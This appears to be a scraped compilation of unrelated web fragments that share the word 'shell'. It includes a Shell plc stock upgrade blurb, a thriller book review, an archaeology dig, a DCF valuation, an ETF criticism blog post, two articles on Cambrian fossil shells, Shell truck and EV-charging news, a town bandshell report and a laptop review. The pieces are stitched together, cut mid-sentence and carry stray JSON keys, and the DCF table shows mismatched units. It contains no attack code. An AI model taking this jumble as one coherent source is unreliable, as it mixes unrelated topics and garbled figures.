de la NASA\n\nNASA en espa\u00f1ol\n\nSpace Place para ni\u00f1os",

In this article, we are going to take a look at where Shell plc (NYSE:SHEL) stands against the other companies that just upgraded.\n\nThe last week was full of negativity as the S&P went down nearly 3.5%. Matters were made worse by raging wildfires in Los Angeles, which have shocked people across the country. Amidst all this, there were a lot of positive developments as analysts continued to point out companies poised for a great performance in 2025.\n\nArtificial Intelligence stocks continue to dominate coverage despite the fear of a slowdown in spending. With agentic AI the new hype, many companies are only just entering their AI journey, so investors still have a lot of undervalued plays that are worth looking at.\n\nTo come up with the list of 10 companies that analysts just upgraded, we only considered companies with a market cap of at least $1 billion.\n\nIs Shell plc (SHEL) Among Top Oil and Gas Stocks To Invest In According to Hedge Funds?\n\nA gas refinery lit up against the night sky, showing the scale of the company's petrochemical operations.\n\nShell plc (NYSE:SHEL)\n\nShell plc (NYSE:SHEL) is an energy and petrochemical company that operates through the segments of integrated gas, upstream, marketing, chemicals and products, and renewable and energy solutions. The company markets and trades commodities, including LNG, natural gas, electricity, oil, and carbon emission rights. It was upgraded by UBS from Neutral to Buy on the back of its cash flow strength.\n\nAlthough Shell\u2019s shares are down 10%, the company boasts a strong balance sheet which should also be adequate to complete its ongoing buyback. According to UBS analysts, there\u2019s an opportunity for $6B through cost-saving measures. This amount can be utilized to meet or exceed the company\u2019s 2025 targets.\n\nWith a free cashflow yield of 14%, Shell plc (NYSE:SHEL)\u2019s FCF yield is ranked as the highest among European oil stocks. The company\u2019s financial health is solid with significant profits and low debt. The company has no massive debt to pay off and several growth projects, so it can be a good option to consider in 2025.\n\nOverall SHEL ranks 5th on our list of the companies that just upgraded by analysts. While we acknowledge the potential of SHEL as an investment, our conviction lies in the belief that some AI stocks hold greater promise for delivering higher returns, and doing so within a shorter timeframe. If you are looking for an AI stock that is as promising as SHEL but that trades at less than 5 times its earnings, check out our report about the cheapest AI stock.",

Her taut writing, intricate plotting, hairpin turns, and unexpected twists will keep the reader glued to the pages unable to foresee the outcome as Shell Games unfolds at a break-neck speed.\n\nIt is a complex relationship drama with some serious, high-stakes gamesmanship as various parties vie to gain control of the billion-dollar business empire that comprises Kate Sawyer\u2019s estate. There are reputed links to a notorious 40-year-old multiple murder cold case as well as an investigation into white-collar drug dealing and money laundering. Mix in a Cat-5 hurricane that isolates Kate, her attorney daughter Julie, and the husband-and-wife caretakers of her multi-million dollar waterfront home built on a barrier island when the single bridge to the mainland is closed before they can comply with evacuation orders. It\u2019s a thrill a minute that keeps the reader guessing!\n\nPower, Love, and Secrets Collide in Sarasota\n\nThe setting is the historic, stunning beach community of Sarasota, Florida known for its cultural attractions, social activities, and abundance of affluent residents. The large percentage of millionaires makes it one of the wealthiest cities in the state with an inordinately high number of upscale financial management companies and real estate development planners. Kate Sawyer (ne\u00e9 Weller) is a self-made billionaire developer, recognized for her company\u2019s innovative designs, planned gated communities, and for clashing with environmental activists concerned about her many projects responsible for destroying wildlife habitat, erosion, and climate change.\n\nHer late husband, daughter Julie\u2019s father, had little to do with her remarkable achievements. Kate excelled at every endeavor with a winning combination of brains, ambition, and beauty. Now 70, she retains her slim figure and glamorous appearance with rigorous exercise and an intensive beauty regime including nightly peptide injections. She is a firm believer these amino acid chains are the key to anti-aging. Power broker Kate was determined to continue her dominance in commercial real estate and her lofty position in society as a philanthropist and influencer in politics. What she hadn\u2019t expected was a whirlwind romance with a former high school boyfriend.\n\nHurricane Winds Uncover Billion-Dollar Betrayals\n\nShell Games opens at the lavish wedding reception of Kate Sawyer and Charlie Mull which she meticulously planned and the month-long luxury honeymoon cruise to Tahiti beginning the next day. Kate had literally tumbled head-over-heels down the stairs of their high school bleachers cracking her skull on the cement landing watching star athlete Charlie playing football. He raced off the field in mid-play to summon medical attention for her. These teenage heartthrobs were inseparable until after high school graduation when Charlie went off to Vietnam and Kate headed to the ivy-covered walls of Radcliffe College. His military tours of duty included several combat zones which left his legs peppered with shrapnel.\n\nLong retired from military service, Charlie was an upmarket car salesman. Julie\u2019s orthopedic surgeon husband, Eric, met him while shopping for a coveted Lamborghini and invited him to dinner to meet his wife Julie and his mother-in-law. Julie had lived so long in the shadow of her aggressively successful mother and domineering husband that she failed to appreciate her own capabilities. She was a corporate attorney who worked for her mother\u2019s corporation and was submissive to Eric\u2019s whims and desires including his choice of a modern showplace home instead of the charming Victorian-style cottage she loved.\n\nSparks reignited between the mature couple and their second-chance romance was on a fast track to marriage. Kate detested her handsome, arrogant son-in-law suspecting he married her only child, the mousy Julie, for her mother\u2019s money but was convinced Charlie\u2019s devotion was true love. The pre-nuptial agreement with Charlie limited his inheritance to her oceanfront mansion worth roughly $28 million leaving the bulk of her estate to a designated charitable foundation.\n\nSecond Chance Romance Spirals into Dark Deceptions\n\nPlans, dreams, and honeymoon were put on hold when the tipsy couple returned home, and Charlie confessed a bombshell secret \u2014 he was the Tylenol killer. The police and Julie were summoned, and Charlie was banished. Bizarrely, despite the lateness of the hour, Eric immediately called in his sister, Greta, a family court judge, and her husband Greg, a prominent neurologist. Within no time, he is adamant Kate has dementia, is unable to control her own affairs, and orders Julie to obtain power of attorney to institutionalize her if necessary.\n\nThe FBI denies the possibility of Charlie\u2019s involvement in the notorious, unsolved case and Charlie denied confessing within hours. Kate is not willing to concede any physical or mental weakness and readies for the fight of a lifetime to protect herself and her business empire. Wisely, Julie begins to question her husband\u2019s mind games and motives as well as his eagerness to seize control of her mother\u2019s hard-earned billions. She defies his orders and moves in with her mother while Charlie moves in with Eric.\n\nReaders may be reminded of the 1944 George Cukor classic film Gaslight which starred Ingrid Bergman and Charles Boyer. Tension mounts as rapidly as the storm warnings for an impending catastrophic hurricane approaching the Florida coast. If you were at the movies, you might gnaw your knuckles or bite your nails instead of munching popcorn as this ever-surprising thriller nears its climactic conclusion.\n\nBonnie Kistler never writes a dull story.

As they sifted through dirt and shells beneath the Spanish moss covered trees on a cold, bright January afternoon, a tour group stopped by to observe their work.\n\nIt was an unusual flurry of activity for the Green Shell Heritage Preserve, a historic site and park on the edge of a marsh beside Skull Creek. Archeologists and students with the S.C. Department of Natural Resources Heritage Trust were on day two of a two-week archeological survey of the area.\n\nThe survey is intended to apply modern research methods to an ancient man-made feature, mapping and logging artifacts and data while allowing the public a behind-the-scenes view of the process.\n\nFree public tours of the enclosure will be held until Jan. 16. Registration was full as of Jan. 7. Still, archeologist Meg Gaillard encouraged those interested to sign up for the waitlist or walk up during one of the tour times to see if there are any spots available. Tours are offered daily at 10 a.m., 1 p.m. and 2 p.m.\n\nOne day into the dig and artifacts were already discovered.\n\n\"We\u2019ve been finding Irene Phase pottery, which is just gorgeous,\" Gaillard said, noting the archaeological phase on the Georgia Coast that occurred between 1300 and 1400 CE.\n\nThe well-preserved shards reaffirm what archeologists have known for decades: shell rings offer a unique glimpse into the past and an understanding of the continent's first people.\n\nShell rings and ancient people\n\nShell rings have been around for quite some time, but in recent years there has been a renewed sense of urgency in researching the sites, said Gaillard.

Today, we will estimate the stock's intrinsic value by taking the forecast future cash flows of the company and discounting them back to today's value. Our analysis will employ the Discounted Cash Flow (DCF) model. Believe it or not, it's not too difficult to follow, as you'll see from our example!\n\nCompanies can be valued in a lot of ways, so we would point out that a DCF is not perfect for every situation. If you want to learn more about discounted cash flow, the rationale behind this calculation can be read in detail in the Simply Wall St analysis model.\n\nCheck out our latest analysis for Shell\n\nStep By Step Through The Calculation\n\nWe use what is known as a 2-stage model, which simply means we have two different periods of growth rates for the company's cash flows. Generally the first stage is higher growth, and the second stage is a lower growth phase. To start off with, we need to estimate the next ten years of cash flows. Where possible we use analyst estimates, but when these aren't available we extrapolate the previous free cash flow (FCF) from the last estimate or reported value. We assume companies with shrinking free cash flow will slow their rate of shrinkage, and that companies with growing free cash flow will see their growth rate slow, over this period. We do this to reflect that growth tends to slow more in the early years than it does in later years.\n\nGenerally we assume that a dollar today is more valuable than a dollar in the future, and so the sum of these future cash flows is then discounted to today's value:\n\n10-year free cash flow (FCF) estimate\n\n2025 2026 2027 2028 2029 2030 2031 2032 2033 2034 Levered FCF ($, Millions) US$25.5b US$24.7b US$21.9b US$21.6b US$25.2b US$25.4b US$25.7b US$26.1b US$26.6b US$27.1b Growth Rate Estimate Source Analyst x10 Analyst x10 Analyst x5 Analyst x3 Analyst x1 Est @ 0.96% Est @ 1.30% Est @ 1.55% Est @ 1.72% Est @ 1.83% Present Value ($, Millions) Discounted @ 8.3% US$23.5k US$21.1k US$17.2k US$15.7k US$16.9k US$15.8k US$14.7k US$13.8k US$13.0k US$12.2k\n\n(\"Est\" = FCF growth rate estimated by Simply Wall St)\n\nPresent Value of 10-year Cash Flow (PVCF) = US$164b\n\nAfter calculating the present value of future cash flows in the initial 10-year period, we need to calculate the Terminal Value, which accounts for all future cash flows beyond the first stage. For a number of reasons a very conservative growth rate is used that cannot exceed that of a country's GDP growth. In this case we have used the 5-year average of the 10-year government bond yield (2.1%) to estimate future growth. In the same way as with the 10-year 'growth' period, we discount future cash flows to today's value, using a cost of equity of 8.3%.",

            "content": "I might have more to say about this either here or on other platforms but I\u2019ve kept a close eye on an ETF line called \u201cYieldMax\u201d. They mainly offer single stock covered call ETFs and they\u2019ve been aggressive in selling on yield. For instance here\u2019s what greets you when you visit their site for YieldMax TSLA Option Income (ticker: TSLY).\n\nSubtle it ain\u2019t. Jason Zweig previously wrote about this crop of ETFs and their questionable marketing practices here. Jason said it well so no need to belabor his message\u2014buyer beware.\n\nNevertheless, I\u2019ve kept tabs on them. Their manager, Tidal, seems to engage in a practice of setting sky-high distribution rates and then, when income and gains from the ETFs\u2019 underlying investments predictably fall short of funding those distributions, dipping into capital to cover the shortfall.\n\nHow pervasive has that practice of returning capital been? They just filed the annual report for the YieldMax ETFs\u2019 fiscal year ended 10/31/24 and what it shows is that roughly two-thirds of the dollars they distributed were returns of capital.\n\nmy caption\n\nIn TSLY\u2019s case, the distributions were almost entirely return of capital. All told, over its life, the ETF has made around $620 million of distributions, only about $40 million of which has been ordinary income. In other words 94 cents of every dollar they\u2019ve sent back to shareholders has been their own capital.\n\nMaking matters worse, it appears* Tidal hasn\u2019t always provided an accurate accounting of the tax character of these distributions over the course of the year. I tweeted about their having filed an amended semi-annual report (just before they filed their annual report) in which it appears they revised their reporting of the tax character of distributions the ETFs made over the six months ended 4/30/24.\n\n(Bizarrely, the annual report appears to further revise the numbers they showed in the just-filed amended semi-annual report. For instance in the revised semi-annual report they were showing that TSLY\u2019s distributions consisted of $143.2MM of ordinary income vs $80.4MM of return of capital. The annual report however shows that for the full year they distributed ordinary income of just $31.8MM, which suggests that in the back half of their fiscal year the ETF distributed -$111.4MM in ordinary income.)\n\nThe ETF\u2019s tax filings are also hard to reconcile to what they just reported in the annual report. For instance here they seem to report that the ETF\u2019s year to date distributions through 10/4/24 were 64% income/36% return of capital.\n\nThese seem like shell games to me. Tout a huge \u2018distribution yield\u2019, lure in credulous investors, levy high fees (Tidal earned nearly $28MM in aggregate across the ETFs in year ended 10/31/24 per the annual report), deliver a fraction of the underlying stocks\u2019 returns, and return gobs of capital to uphold the pretense of generating huge \u2018yields\u2019.\n\n* I say \u201cappears\u201d because I\u2019m not a fund accounting expert. I suppose it\u2019s possible the tax character of these distributions could change as the year wears on depending on how one defines \u201cordinary income\u201d. Correct me if I\u2019m wrong and I\u2019ll update this accordingly.\n\nThe views and opinions expressed in this blog post are those of Jeffrey Ptak and do not necessarily reflect those of Morningstar Research Services or its affiliates.",

            "content": "A new investigation of tiny Cambrian shells has sparked excitement among experts who study how life changed when animals, both predators and prey, first expanded in number and variety.\n\nThe research, published in Current Biology, focuses on shell fragments from a small animal related to brachiopods.\n\nThese ancient remnants come from the ocean covering what is now South Australia. The shells are dotted with tiny perforations that some unknown marine creature must have made about 517 million years ago.\n\nCambrian waters and shells of prey\n\nThe Cambrian Explosion was a phase in Earth\u2019s history when many animal groups appeared in the fossil record in a short span of time.\n\nIt began roughly 541 million years ago, and it introduced an incredible diversity of organisms that possessed shells, spines, and other protective structures. Yet specialists have questioned how these defense features developed so quickly.\n\nDid predators force prey to reinforce their shells and adapt? Or did environmental changes spark widespread new traits in ocean life?\n\nAfter puzzling over these questions for decades, experts are now pointing to new shell damage as possible proof of a rapid back-and-forth struggle between attackers and the creatures they targeted.\n\nShell holes reveal predator-prey interactions\n\nThis fresh look at the shells was spearheaded by Russell Bicknell of the American Museum of Natural History.\n\nBicknell joined forces with colleagues from the University of New England and Macquarie University to study the tiny armor of a Cambrian species called Lapworthella fasciculata.\n\nThe shell fragments ranged from a little larger than a grain of sand to something about the size of an apple seed. Researchers spotted more than 200 pieces with punctures that look as if a worm-like or snail-like predator produced them.\n\nOver time, the shells appear to have become thicker and stronger, which suggests a quick answer by L. fasciculata to defend itself.\n\nEvidence reveals attacks on shelled prey\n\nThe team examined the fossil remains across different points in Cambrian history. They found that holes in the shells gradually rose in frequency while the shell walls became tougher in a short window.\n\nExamples of Lapworthella fasciculata shells (under scanning electron microscope) from the Mernmerna Formation, Flinders Ranges, South Australia, showing holes made by a perforating predator. Scale bars represent 200 micrometers. Credit: R. Bicknell, et al (2025) Current Biology\n\n\u201cPredator-prey interactions are often touted as a major driver of the Cambrian explosion, especially with regard to the rapid increase in diversity and abundance of biomineralizing organisms at this time. Yet, there has been a paucity of empirical evidence showing that prey directly responded to predation, and vice versa,\u201d said Bicknell.\n\nUnexpected speed of adaptation\n\nScientists have long suspected that early animals developed new defenses to keep up with evolving predators. This shift is frequently described as an arms race because each improvement from one side pushes the other side to respond.\n\nThe remarkable part is how swiftly L. fasciculata managed to boost its shell thickness. In a few generations, the predator must have increased its ability to break through stronger shells.\n\nAccording to research from 1987, early Paleozoic life underwent several bursts of diversification, partly driven by escalating attacks in marine environments.\n\nTiny shells, big implications\n\nThe tiny shells open a window into the daily struggles of creatures that once lived in shallow seas filled with new forms of life.\n\nThese findings add weight to the idea that confrontation between small predators and their prey influenced the rapid spread of protective traits, such as tougher shells, in the early Cambrian.\n\nA thickened shell could have meant the difference between living and becoming a snack. Some scientists propose that these predator-prey interactions may have shaped early marine communities more than previously assumed.\n\nFilling gaps in the fossil record\n\nFossils from the Cambrian are not always easy to interpret.\n\nSoft-bodied creatures rarely fossilize well, and skeletal fragments often appear in fragments scattered through sedimentary rock. Many experts have struggled to figure out exactly which predators might have roamed these waters.\n\nThe punctured shells from L. fasciculata provide valuable clues because they are preserved well enough to show unmistakable signs of drilling or piercing.\n\nThese marks are a real boost to understanding how shells and predatory tools advanced in lockstep.\n\nWhy it matters for today\u2019s shelled preys\n\nShell protection still matters in modern oceans, from clams to snails. When researchers look at how Cambrian animals beefed up their shells, they see patterns that may match modern dynamics.\n\nCrabs, for instance, often feed on shelled prey, and those prey can shift their own growth strategies in response.\n\nLooking at these ancient shells confirms that this tug-of-war between attacker and defender is nothing new. While more discoveries are needed, the takeaway is that even half a billion years ago, survival hinged on how well an organism handled the never-ending threat of becoming someone else\u2019s lunch.\n\nConnections to broader evolutionary questions\n\nFossil shells tell us that the Cambrian Explosion\u2019s rapid spread of animal life involved a tense duel between those doing the hunting and those trying to avoid it.\n\nThis new research highlights that predation is more than a violent encounter; it is a potent force pushing creatures to adapt in surprising ways.\n\nScientists will likely hunt for similar evidence in other early animal groups. Future work may close gaps in our knowledge of who attacked whom in those ancient seas and how quickly the defenders responded.\n\nThe study is published in the journal Current Biology.\n\n\u2014\u2013\n\nLike what you read?

Some of the holey shells became fossilized, and now tell us the story of the earliest known battle between predator and prey that influenced both species' evolution.\n\n\"This critically important evolutionary record demonstrates, for the first time, that predation played a pivotal role in the proliferation of early animal ecosystems,\" explains American Museum of Natural History paleontologist Russell Bicknell.\n\nThese fossilized shells belong to an early lamp shell relative, Lapworthella fasciculata, found at what's now Flinders Ranges, South Australia. They lived and died amidst one of the Earth's earliest explosions of life's diversity, the Cambrian Explosion.\n\nHow such a rapid diversification of life occurred has long fascinated researchers. One mechanism well known to drive evolution is the battle between predators and prey, which often turns into a kind of \"arms race.\"\n\nFor example, fungi creating antibiotics against bacteria then pressure bacteria to form resistance, or big brown bats (Eptesicus fuscus) echolocating to detect tiger moths (Bertholdia trigona) that, over generations, then developed ways to confuse the bats by echolocating back.\n\n\"Predator-prey interactions are often touted as a major driver of the Cambrian explosion, especially with regard to the rapid increase in diversity and abundance of biomineralizing organisms at this time,\" says Bicknell. \"Yet, there has been a paucity of empirical evidence showing that prey directly responded to predation, and vice versa.\"\n\nL. fasciculata's shells provide that example, of ancient interacting species shaping each other's evolution.\n\nThe positioning of the punctures and that they occurred in about the same point in all the examined shells, as well as shells from neighboring species, suggests they were the result of predatory action, the researchers explain.\n\nL. fasciculata's shells range from the size of a grain of sand to a sunflower seed, and the researchers were able to recover more than 200 of them with the telltale holes of a perforating predator.\n\nBy mapping them out according to their biological ages, Bicknell and team could see that the shells got thicker after a spate of hole punching occurred, reducing the frequency of shells with holes.\n\nBut over time, the predatory worm or mollusk clearly beefed up whatever its puncturing weapon was, resulting in perforated L. fasciculata shells peaking at rates of almost four percent. Shell thickness increased again, and perforated shell numbers dropped back down to around two percent.\n\nThis cycle of prey boosting its defenses and predator boosting its weapons seems to illustrate an evolutionary arms race \u2013 and at 517 million years old, it's now the earliest known example.\n\nIt also \"shows the rapid speed at which such phenotypic modifications arose during the Cambrian Explosion event,\" Bicknell says.\n\nSuch strong selection pressures when coupled with separation can lead to the creation of new species.\n\nThis research was published in Current Biology.",

            "content": "The Shell Starship Initiative has been on an interesting journey since its inception in 2018, with a mission to redefine energy efficiency in the commercial trucking sector. Starting with diesel engines, the first two versions of the Starship made impressive strides in fuel efficiency, but now, with the introduction of the Starship 3.0, we\u2019re witnessing a remarkable shift towards sustainability. This latest iteration features the innovative Cummins X15N natural gas engine, which not only enhances performance but also significantly reduces emissions.\n\nEvolution of the Starship initiative\n\nThe Shell Starship Initiative began with a clear goal: to set new benchmarks for energy efficiency in commercial trucking. The first two versions of the Starship were powered by diesel engines, achieving notable fuel efficiencies compared to industry standards. However, the introduction of the Cummins X15N natural gas engine in the Starship 3.0 represents a pivotal shift away from diesel, addressing both environmental concerns and operational efficiency.\n\nThe X15N engine, launched in 2024, is designed specifically for heavy-duty applications and overcomes previous limitations associated with natural gas as a fuel source. It provides similar power outputs to diesel engines but does so with enhanced fuel efficiency and significantly lower emissions. This is particularly important as the trucking industry faces increasing pressure to meet stricter environmental regulations.\n\nYOU WON\u2019T BELIEVE HOW FAR VOLVO\u2019S NEW ELECTRIC SEMI-TRUCK GOES ON A SINGLE CHARGE\n\nKey features of Starship 3.0\n\nThe Starship 3.0 is packed with cutting-edge features that set it apart in the world of trucking. From its innovative natural gas powertrain to its sleek aerodynamic design, every aspect of this vehicle has been meticulously crafted to enhance efficiency and reduce emissions. Let\u2019s dive into some of the standout features that make the Starship 3.0 a game-changer for the industry.\n\nNatural gas powertrain: The switch to the Cummins X15N engine allows the Starship 3.0 to operate on various forms of natural gas, including renewable natural gas (RNG). This adaptability not only enhances its eco-friendliness but also positions it as a practical option for fleets looking to transition away from traditional fuels.\n\nWeight reduction: The new engine is approximately 500 pounds lighter than its diesel counterpart, which increases the potential freight-carrying capacity of the truck. This weight reduction is complemented by other lightweight materials used in the truck\u2019s construction, contributing to an impressive ton-miles per gallon efficiency of 183, compared to an industry average of 72.\n\nAerodynamic design: The Starship 3.0 features a sleek design with curved edges and optimized aerodynamics that reduce wind resistance. Additional enhancements like low rolling resistance tires and integrated aerodynamic panels further contribute to its efficiency.\n\nAdvanced lubricants: Shell has developed specialized lubricants tailored for the higher temperatures generated by natural gas engines. The truck uses Shell Rotella NG Plus SAE 5W-30 synthetic oil, formulated specifically for this purpose, alongside advanced transmission lubricants that improve overall performance.\n\nReal-world testing: The input from experienced truck drivers, such as brothers Brian and Eric Rector, has been invaluable in refining the Starship\u2019s design and functionality. Their hands-on experience with all three iterations of the truck has provided critical data that informs ongoing improvements.\n\nBULLET TRAIN LOOKING GIANT SEMI TRUCK TO HIT US HIGHWAYS\n\nPerformance metrics\n\nThe performance metrics achieved by the Starship 3.0 are impressive. It surpassed its predecessors with a freight ton efficiency that is 2.542 times better on a ton-miles per gallon basis, while also achieving an average fuel consumption of 9 mpg (diesel gallon equivalent) while hauling an industry maximum load of 80,000 pounds. Additionally, the emissions reductions associated with using renewable natural gas (RNG) further enhance its environmental credentials, making it a viable option for fleets aiming for sustainability.\n\nTESLA SEMI\u2019S IMPRESSIVE PERFORMANCE ON ICE MARKS ANOTHER MAJOR TRIUMPH\n\nKurt\u2019s key takeaways\n\nThe Starship 3.0, with its innovative natural gas engine and impressive performance metrics, showcases how technology can transform the industry while addressing environmental concerns. This initiative not only sets new benchmarks for energy efficiency but also offers a practical roadmap for fleets looking to reduce their carbon footprint.\n\nDo you believe that transitioning to natural gas and other eco-friendly technologies is the key to addressing environmental challenges, or do you think there are other solutions that should be explored?

            "content": "Last Updated on:\n\nA couple weeks ago, news broke that Shell Recharge is getting out of the software market. Normally, getting out of software means not sending out installation files to customers anymore, allowing competing software companies to take care of people\u2019s needs. But, in the case of EV charging, this means a lot more. Shell has been offering more of a service, connecting disparate privately-owned charging stations into a coherent network that EV drivers could use.\n\nInstead of continuing to manage these third party chargers, the company is going to disconnect them from the Shell network entirely. This means that, assuming nothing is done, these chargers would go offline. It\u2019s now up to the stations\u2019 ownership to find another software and backend provider to work with. For most charging stations, the hardware supports open protocols and it wouldn\u2019t be a big deal to join another network, so most of these stations aren\u2019t going to go dead at the end of April. The company is also taking the additional step of working to make sure site owners have an easy time migrating to other providers that Shell already works with.\n\nShell told media that the goal of cutting off Shell Sky software customers was to focus on the stations the company itself owns, which currently totals more than 70,000 globally. The company told customers that it needs to focus on investing in areas where Shell has a competitive advantage, which implies that there\u2019s no competitive advantage to supporting third party chargers and having them on the network.\n\nWhy Not Owning Chargers Drags A Network Down\n\nTo explain why Shell doesn\u2019t think third party charging is working out, we have to take a quick imaginary trip to Baker, Nevada. I\u2019ve never been to Baker, but plan to go there in a year or two as part of my Charge To The Parks project. By showing that EVs can make it out even to remote parks like the nearby Great Basin National Park, we can help potential EV buyers to feel more confident buying one.\n\nBut, there\u2019s a problem in Baker: the town\u2019s lone charger at the Border Inn Casino doesn\u2019t look great on PlugShare. If you trust PlugShare\u2019s rating methodology (it\u2019s pretty easy going), you still only have around a 50:50 shot of getting a charge. It\u2019s on the Shell Recharge app, but it\u2019s not owned by Shell. So, when something goes wrong and the site needs expensive work, Shell can\u2019t just get it done. The owners of the casino probably haven\u2019t been seeing any real money come from the chargers, so they\u2019re probably not going to invest in keeping them up.\n\nThis isn\u2019t great for anybody involved. The EV driver gets to head to a nearby RV park for charging at up to 9 kilowatts instead of getting 50 kilowatts from the DC fast charger. At least the RV parks have cabins you can rent! The reputation of the Shell network is sullied when people see a Shell station in the Shell app strand them. The Casino also suffers some reputational damage and lost business when people can\u2019t go there for a charge, but there aren\u2019t enough EV drivers coming through Baker yet for that to hurt them much. The house always wins, right? At least for now.\n\nOne of the biggest competing networks that doesn\u2019t own its chargers is ChargePoint. As I\u2019ve repeatedly shared before, ChargePoint has had similar problems, with owners not wanting to upkeep the stations. In response, the company now does its best to get new station owners to sign up for a service plan so that ChargePoint can quickly repair busted stalls instead of waiting for the owner (who may have gotten grant money to put the thing in) to have the cash for repairs.\n\nLooking at what\u2019s happening with Shell and what\u2019s happening with ChargePoint, it\u2019s pretty clear: the whole business model of running the software and network while others own and maintain the stations is a dead end. Any network that wants to compete going forward is going to need to either own the stations themselves or make good arrangements to make sure the stations are reliable.\n\nFeatured image by Shell.",

The first design garnered bid estimates as high as $747,000.\n\n\u201cFor concerts you don\u2019t sell tickets for, it\u2019s hard to make that up,\u201d Kriebel said.\n\nThe new design was simplified but will still serve its purpose, have a unique shape and make a statement, he said.\n\n\u201cOver time, we can add plantings and accessories, so it works best for the concert series,\u201d he said.\n\nThe city has been working to replace the aging gazebo that once stood along Newport Avenue for more than two years. The first design created by William McLees Architecture of Somers Point promised to \u201cfloat like a butterfly\u201d above the sandy beach behind the Ventnor Cultural Arts Center and Community Building.\n\nAfter the first round of bids received in June 2024 came in much higher than expected, the board rejected them and scaled back the plan to lower costs. A second round of bids received in October were also rejected and the project scaled back a second time. The third round of bids received Dec. 31, 2024 was a charm, coming in within budget, Kriebel said.\n\nThe city received six offers from a high of $437,277 with Massett as the lowest bidder.\n\nCommissioner of Finance Maria Mento asked the board to remind the public about the original bid amount.\n\n\u201cYou are also taking the interests of the residents and taxpayers when spending money,\u201d she said.\n\nThe project is being funded through several bond ordinances approved years prior, a $50,000 state recreation grant, and the Ventnor Beautification Committee has pledged $75,000 toward the cost.\n\nAlthough the project was not able to be completed for the last summer season, arrangements were made to hold the concerts at Ski Beach. However, public outcry demanded the concerts stay at Newport Avenue and the city erected a temporary stage.\n\nThe city is now confident the project could be completed by Memorial Day.\n\nMeanwhile, Ventnor Special Events announced its lineup of community events and concerts for the summer season.\n\nSummer Beach Jam concerts will be held Saturday evenings at the new bandshell June 28, July 8, 12 and 19, Aug. 7, 9, 16, 23 and 30.\n\nOn Wednesday evenings, Sunsets at Ski Beach concerts will be held June 25, July 2, 9, 16 and 30, Aug. 6, 13, 20 and 27. Movie Nights will be held at Ski Beach Monday, June 30, July 28 and Aug. 25.\n\nVentnor's Ski Beach\n\n\n\nThe line up of community events includes:\n\nSpring Shredding Event at Ski Beach, Saturday, April 26\n\nVentnor Block Party on Ventnor Avenue, Saturday, May 10\n\nChef\u2019s Night Out, Sunday, May 18\n\nKickoff to Summer, Friday, May 23 to Monday, May 26\n\nLeTour de Downbeach at Newport Avenue, Sunday, June 1\n\nAmerican Cancer Society Bike-a-Thon rolls into Ski Beach, Sunday, June 1\n\nCitywide Yardsale, Saturday and Sunday, June 28-29\n\nIndependence Day Celebration, Ventnor Mile Run and Fireworks at Newport Avenue, Thursday, July 3\n\nNational Night Out at Newport Avenue, Tuesday, Aug. 5\n\nDownbeach Seafood Festival at Ski Beach, Saturday and Sunday, Sept. 13-14\n\nMangia, Mangia Pasta Dinner at the Red Room Caf\u00e9, Sunday, Sept. 28\n\nFall Shredding Event at Ski Beach, Saturday, Oct. 4\n\nHalloween Fest and Parade at Ski Beach, Sunday, Oct. 26\n\nTwilight Holiday Parade on Ventnor Avenue, Saturday, Dec. 6\n\nFor more information, see Ventnor Special Events on Facebook.\n\n\n\n\n\nCopyright Access Network 2025\n\n\n\n",

It\u2019s designed to be carbon neutral, made with recycled materials as well as an oyster shell casing. The material is quite flimsy, but this is easy to look past considering the performance you get.\n\nWhy you can trust TechRadar We spend hours testing every product or service we review, so you can be sure you\u2019re buying the best. Find out more about how we test.\n\nWe\u2019ve seen a wide range of new tech announced and showcased at CES 2025, including everything from gaming handhelds to electric scooters. The star of the show has certainly been AI, and the new Acer Aspire Vero 16 takes full advantage all while being encased in a blend of post-consumer recycled plastic and a brand-new oyster shell material.\n\nAcer has stated that the Acer Aspire Vero 16 is committed to carbon neutrality for its entire life cycle. On top of using bio-based materials, it uses an easy to fix design in order to ensure that repairing is an option before replacing.\n\nPrice and availability\n\n(Image credit: Future / Jasmine Mannan)\n\nThe Acer Aspire Vero 16 is set to release in April in the US at $799.99 and then later on in Q2 in Europe at \u20ac1,199. These are starting prices which will fluctuate based on the specifications you\u2019re looking for.\n\nIt\u2019s definitely one of the more affordable options on the market, especially in the US. However, regional pricing puts it at a much higher price point elsewhere.\n\nDesign\n\nImage 1 of 3 (Image credit: Future / Jasmine Mannan) (Image credit: Future / Jasmine Mannan) (Image credit: Future / Jasmine Mannan)\n\nWhen first laying-eyes on the Acer Aspire Vero 16, I think its quite clear that it\u2019s made from recycled material due to the color and design. It looks pretty, with a marbled green chassis encasing the entire device including the trackpad. As well as recycled plastic, the chassis is also made from oyster shell material, making it carbon neutral and 100% recyclable.\n\nUnfortunately, when holding and using the Acer Aspire Vero 16, it feels like cheap plastic. The casing has quite a light and fragile feel to it, and I wouldn\u2019t entirely trust the Vero 16 in my backpack without an extra layer of protection like a case or sleeve - and even then, it\u2019s a risk.\n\nDespite being cased in plastic, the Acer Aspire Vero 16 is actually a bit heavier than I was expecting. It weighs in at 3.97 lbs (1.8kg), which isn\u2019t the most lightweight option out there, but isn\u2019t too heavy for you to transport to and from work or keep with you on the go either. Just be sure to pack it up snug and secure.\n\nImage 1 of 2 (Image credit: Future / Jasmine Mannan) (Image credit: Future / Jasmine Mannan)\n\nThe Acer Aspire Vero 16 measures in at less than 2cm and despite being so slim, it still comes packed full of ports. You get to take advantage of two Thunderbolt ports, as well as a USB-A port, an HDMI 2.1 port and an audio jack.\n\nYou get an LCD display panel on the Vero 16, which is 1920 x 1200 pixels. Despite not being OLED, the screen is actually very bright and vibrant. It looks absolutely stunning but did leave me wanting slightly more in terms of resolution, however at this price point you can\u2019t complain too much.\n\nSpecifications\n\nSwipe to scroll horizontally Acer Aspire Vero 16 Specs Price: $799.99 CPU: Up to Intel Core Ultra 7 255H Graphics: Intel Arc Graphics RAM: 32GB LPDDR5X Display: LCD, Up to 16-inch, 1920 x 1200p Storage: Up to 2TB M.2 Ports: 2x Thunderbolt 4 (DP support), 1x USB-A, 1x Audio Jack, 1x HDMI 2.1 (TMDS) Connectivity: Wi-Fi 7 + Bluetooth 5.4 Camera: 1440p QHD Weight: 3.97 lbs (1.8kg) Dimensions: 259.4 (W) x 247 (D) x 12.4 x 19.6 (H) mm Battery: 65Wh\n\nPerformance\n\n(Image credit: Future / Jasmine Mannan)\n\nPicking up the Acer Aspire Vero 16 allows you to take advantage of up to an Intel Core Ultra 7 255H processor paired with Intel Arc graphics as well as 32GB of RAM. This machine offers absolutely insane performance, especially for its price point. Regardless of what you\u2019re intending to use it for, it offers a high level of performance for a wide range of productivity and creativity tasks.\n\nOf course, having this processor means you get to take advantage of a range of AI features including 